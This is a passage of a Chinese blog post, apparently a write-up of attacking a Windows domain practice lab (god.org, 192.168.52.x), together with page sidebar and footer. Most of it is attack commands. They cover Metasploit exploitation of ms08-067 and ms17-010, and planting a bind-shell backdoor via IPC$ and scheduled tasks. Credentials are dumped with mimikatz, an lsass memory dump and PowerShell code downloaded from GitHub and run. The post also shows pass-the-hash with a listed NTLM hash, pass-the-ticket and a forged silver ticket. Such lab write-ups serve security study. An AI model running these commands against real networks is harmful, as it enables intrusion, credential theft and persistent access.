+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts 192.168.52.0/24(此处存活主机较少，扫描整个段太浪费时间了。)</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set ports 21-25,53,67-68,80-90,110,139,143,161,389,443,445,512-514,873,1080,1352,1433,1521,2049,2181,2375,3306,3389,4848,5000,5432,5632,5900,6379,7001-7002,8069,8161,8080-8090,9000,9090,9200,9300,11211,27017,27018</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set threads 50</span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure>
+<p><img src="https://k-ring.github.io/img/nw1_6.png" alt><br><strong>之前一直使用auxiliary/scanner/portscan/syn来扫描，但是一直报错，需注意的是使用syn半开扫描需要root权限，我使用的是postgres用户启动的msf，所以此处报错</strong>   </p>
+<p>192.168.52.138和192.168.52.141两台主机都开了139和445端口，可以尝试使用ms08-067和ms17-010两个漏洞    </p>
+<h4 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08-067"></a>ms08-067</h4><p>141主机存在ms08_067漏洞<br>注意的是这里payload使用的是正向连接(之前一直不成功的原因是用的反向连接)，因为设置的路由是单向路由，只能我们访问内网主机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set rhosts 192.168.52.141</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set rhost 192.168.52.141</span><br></pre></td></tr></table></figure></p>
+<h4 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h4><p>使用auxiliary/scanner/smb/smb_ms17_010模块进行扫描是否存在该漏洞<br><img src="https://k-ring.github.io/img/nw1_7.png" alt><br>两台主机都存在该漏洞，但是使用exp打的时候却一直获取不到shell，还有一个exp直接打蓝屏。。。。。</p>
+<hr>
+<p><strong>补充</strong><br>使用<code>ms17_010_psexec</code>这个exp，payload使用正向连接的payload(前面payload容易直接蓝屏，之前失败估计是因为我使用的反向shell的payload)   </p>
+<p>141主机利用成功，138没收到session。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.52.141</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 192.168.52.141</span><br></pre></td></tr></table></figure></p>
+<h4 id="windows利用命令管道远程连接"><a href="#windows利用命令管道远程连接" class="headerlink" title="windows利用命令管道远程连接"></a>windows利用命令管道远程连接</h4><p>根据前面的信息，知道登录这台win7的用户student账号是域管理员，尝试是否可以直接登录其他机器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.52.141 /user:god\student &quot;password&quot;</span><br><span class="line">net use   查看连接</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.52.141\C$</span><br><span class="line">dir \\ 192.168.52.141\C$\windows</span><br><span class="line">type \\192.168.52.141\C$\temp.txt</span><br><span class="line">copy shell.exe \\192.168.52.141\C$     上传文件</span><br><span class="line">copy \\192.168.52.141\C$\shell.exe     下载文件</span><br></pre></td></tr></table></figure>
+<hr>
+<p>上传文件，使用计划任务运行程序反弹shell<br>使用ipc命令管道进行进程间通信感觉还是非常不方便，所以需要上传一个反弹shell的马子，cs或者msf都行，此处使用msf。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">先将文件复制到目标系统中(这里的操作都是在已控的win7上面操作的，复制的文件也是复制的win7上面的文件)</span><br><span class="line">copy shell.exe \\192.168.52.141\C$</span><br><span class="line"></span><br><span class="line">然后查看141主机的时间(为后面设置计划任务做准备)</span><br><span class="line">net time \\192.168.52.141</span><br><span class="line"></span><br><span class="line">使用at命令设置计划任务</span><br><span class="line">at \\192.168.52.141 9:18AM C:\shell.exe</span><br><span class="line"></span><br><span class="line">使用schtasks设置计划任务(windows 2008以后)(创建名称为task_test的计划任务，开机时启动，启动程序为C:\shell.exe，如果之前建立了IPC连接，创建计划任务时不需要/U/P参数设置账户密码)</span><br><span class="line">schtasks /create /s 192.168.52.141 /U god\student /P &quot;password&quot; /tn task_test /sc onstart /tr C:\shell.exe /ru system /f</span><br><span class="line">schtasks /run /s 192.168.52.141 /tn &quot;task_test&quot; /U god\student /P &quot;password&quot; /i</span><br><span class="line">schtasks /f /delete /s 192.168.52.141 /tn &quot;task_test&quot;</span><br><span class="line"></span><br><span class="line">删除ipc$</span><br><span class="line">net use \\192.168.52.141 /del /y</span><br></pre></td></tr></table></figure></p>
+<p><strong>忘了这里141主机不能访问外网，目前还没有想到怎么获得内网不联网主机的shell，后续思考出后再补充</strong>(已解决)     </p>
+<p>因为内网主机不能访问外网，所以要内网主机上线，使用正向连接，将我们的攻击机挂上代理，去连接内网主机(反向用多了，一时没想起正向连接)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用msfvenom生成一个正向连接的exe马</span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=10000 -e x86/shikata_ga_nai -i 5 PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o bindshell.exe</span><br><span class="line"></span><br><span class="line">后面的操作即为上面的操作，只是将shell.exe程序换成正向连接的马bindshell.exe</span><br></pre></td></tr></table></figure></p>
+<p>内网主机定时任务运行之后，在msf上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">设置路由</span><br><span class="line">msf5 exploit(multi/handler) &gt; route add 192.168.52.0/24 1</span><br><span class="line"></span><br><span class="line">设置payload</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set lport 10000</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>即可获得内网主机141的meterpreter会话(直接system权限？)   </p>
+<hr>
+<h4 id="hash传递攻击-PTH"><a href="#hash传递攻击-PTH" class="headerlink" title="hash传递攻击(PTH)"></a>hash传递攻击(PTH)</h4><p>在无法获取系统明文、只能获取到NTLM hash时，可以不用破解，直接传递hash来进行windows登录验证    </p>
+<h6 id="读hash"><a href="#读hash" class="headerlink" title="读hash"></a>读hash</h6><ul>
+<li>注册表读密码    </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM C:\windows\temp\sys.hiv</span><br><span class="line">reg save HKLM\SAM C:\windows\temp\sam.hiv</span><br><span class="line"></span><br><span class="line">mimikatz:</span><br><span class="line">lsadump::sam /sam:sam.hiv /system:sys.hiv</span><br></pre></td></tr></table></figure>
+<ul>
+<li>内存读取     <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>或者使用procdump.exe从内存中取出，再用mimikatz解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot;   &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>powershell调用<br>mimikatz<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>nishang<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1&apos;);Get-PassHashes</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>MSF<br>mimikatz<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest     // 获取明文密码</span><br><span class="line">meterpreter &gt; msv         // 获取所有hash</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>hashdump<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>WCE   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -l</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h5 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h5><p>hash是NTLM Hash，加密方式是rc4    </p>
+<h6 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h6><p>使用impactet中的psexec.py进行hash验证<br>在143主机上获取到hash，然后进行验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py -hashes :abfe7842f36dc84258ee0a049047ccfe god/student@192.168.52.138</span><br></pre></td></tr></table></figure></p>
+<p>smbexec.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :abfe7842f36dc84258ee0a049047ccfe god/student@192.168.52.138</span><br></pre></td></tr></table></figure></p>
+<p>wmiexec.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :abfe7842f36dc84258ee0a049047ccfe god/student@192.168.52.138</span><br></pre></td></tr></table></figure></p>
+<h4 id="票据传递攻击-PTT"><a href="#票据传递攻击-PTT" class="headerlink" title="票据传递攻击(PTT)"></a>票据传递攻击(PTT)</h4><ul>
+<li><strong>使用mimikatz进行票据传递攻击</strong>    </li>
+</ul>
+<p>1、使用mimikatz将已受控主机内存中的票据导出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassmimikatzx64.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>执行完成后，会在当前目录下出现多个服务的票据文件，包含：krbtgt、cifs、ldap等   </p>
+<p>再清除受控主机中内存中的票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassmimikatzx64.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>然后再将票据文件注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassmimikatzx64.exe &quot;kerberos::ptt &quot;C:\phpstudy\phptutorial\www\[0;3d8a8]-2-0-60a00000-student@krbtgt-GOD.ORG.kirbi&quot;&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>这里注入的是krbtgt高权限的票据文件，便可以操作远程计算机(<strong>尝试了cifs票据，不能访问远程计算机的文件目录，这块原理待理解</strong>)   </p>
+<ul>
+<li><strong>使用kekeo进行票据传递</strong>     </li>
+</ul>
+<p>先获取到student用户的NTLM Hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassmimikatzx64.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>然后使用kekeo.exe制作票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:student /domain:god.org /ntlm:abfe7842f36dc84258ee0a049047ccfe&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>将票据导入到内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;kerberos::ptt TGT_student@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>访问内网其他计算机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>(<strong>关于银票和金票这儿还有很大的疑惑</strong>)</p>
+<h6 id="银票"><a href="#银票" class="headerlink" title="银票"></a>银票</h6><p>制作条件：<br>1、域名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line">god.org</span><br></pre></td></tr></table></figure></p>
+<p>2、域的SID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name=&quot;student&quot; get sid</span><br><span class="line"></span><br><span class="line">S-1-5-21-2952760202-1353902439-2381784089-1109</span><br><span class="line">删除最后的RID</span><br><span class="line">SID为：S-1-5-21-2952760202-1353902439-2381784089</span><br></pre></td></tr></table></figure></p>
+<p>3、域中server服务器账户的NTLM-hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassmimikatzx64.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/nw1_8.png" alt>    </p>
+<p>4、伪造的用户名，可以是任意用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassmimikatzx64.exe &quot;kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:root-tvi862ubeh.god.org /service:cifs /rc4:92d3abdd6670cc26e4d75db18a23629d /user:silver /ptt&quot; exit</span><br></pre></td></tr></table></figure></p>
+<h6 id="金票-一般拿下域控后做权限维持"><a href="#金票-一般拿下域控后做权限维持" class="headerlink" title="金票(一般拿下域控后做权限维持)"></a>金票(一般拿下域控后做权限维持)</h6><p>1、域名称<br>2、域的SID<br>3、域的krbtgt账户的NTLM-Hash<br>4、伪造的用户名   </p>
+<hr>
+<h4 id="PSExec使用"><a href="#PSExec使用" class="headerlink" title="PSExec使用"></a>PSExec使用</h4><p>创建了ipc连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.52.141 /user:god\student &quot;password&quot;</span><br><span class="line">psexec.exe \\192.168.52.141 -s cmd.exe -accepteula      //反弹shell</span><br><span class="line">psexec.exe \\192.168.52.141 cmd.exe /c &quot;ipconfig&quot;       //直接执行命令</span><br></pre></td></tr></table></figure></p>
+<p>直接使用psexec连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.52.141 -u god\student -p &quot;password&quot; -s cmd.exe -accepteula</span><br><span class="line">psexec.exe \\192.168.52.141 -u god\student -p &quot;password&quot; cmd.exe /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/20/春招面试准备及部分公司部分面试问题记录/" rel="next" title="春招面试准备及部分公司部分面试问题记录">
+                <i class="fa fa-chevron-left"></i> 春招面试准备及部分公司部分面试问题记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">故人梦</p>
+              <p class="site-description motion-element" itemprop="description">人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统信息收集"><span class="nav-number">2.</span> <span class="nav-text">系统信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限提升及内网信息收集"><span class="nav-number">3.</span> <span class="nav-text">权限提升及内网信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#会话转移至metasploit"><span class="nav-number">3.1.</span> <span class="nav-text">会话转移至metasploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权"><span class="nav-number">3.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz获取账号密码或者hash"><span class="nav-number">3.3.</span> <span class="nav-text">mimikatz获取账号密码或者hash</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#横向渗透"><span class="nav-number">4.</span> <span class="nav-text">横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#portfwd实现端口转发"><span class="nav-number">4.1.</span> <span class="nav-text">portfwd实现端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pivot代理"><span class="nav-number">4.2.</span> <span class="nav-text">pivot代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主机存活扫描"><span class="nav-number">4.3.</span> <span class="nav-text">主机存活扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">4.4.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms08-067"><span class="nav-number">4.5.</span> <span class="nav-text">ms08-067</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms17-010"><span class="nav-number">4.6.</span> <span class="nav-text">ms17-010</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windows利用命令管道远程连接"><span class="nav-number">4.7.</span> <span class="nav-text">windows利用命令管道远程连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hash传递攻击-PTH"><span class="nav-number">4.8.</span> <span class="nav-text">hash传递攻击(PTH)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#读hash"><span class="nav-number">4.8.0.1.</span> <span class="nav-text">读hash</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PTH攻击"><span class="nav-number">4.8.1.</span> <span class="nav-text">PTH攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#impacket"><span class="nav-number">4.8.1.1.</span> <span class="nav-text">impacket</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#票据传递攻击-PTT"><span class="nav-number">4.9.</span> <span class="nav-text">票据传递攻击(PTT)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#银票"><span class="nav-number">4.9.0.1.</span> <span class="nav-text">银票</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#金票-一般拿下域控后做权限维持"><span class="nav-number">4.9.0.2.</span> <span class="nav-text">金票(一般拿下域控后做权限维持)</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#PSExec使用"><span class="nav-number">4.10.</span> <span class="nav-text">PSExec使用</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">故人梦</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">63.3k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
